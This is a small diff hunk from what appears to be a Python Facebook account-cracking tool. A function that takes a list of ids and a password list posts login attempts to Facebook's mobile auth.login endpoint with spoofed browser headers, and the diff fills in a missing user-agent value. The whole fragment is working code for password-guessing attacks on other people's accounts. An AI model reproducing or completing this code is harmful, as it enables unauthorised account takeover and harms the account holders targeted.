@@ -326,7 +326,7 @@ def ___random___(ids,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': }
+            'user-agent': 'ua8'}
             url = 'https://m.alpha.facebook.com/method/auth.login'
             po = requests.post(url,data=data,headers=head,allow_redirects=False).text
             q = json.loads(po)
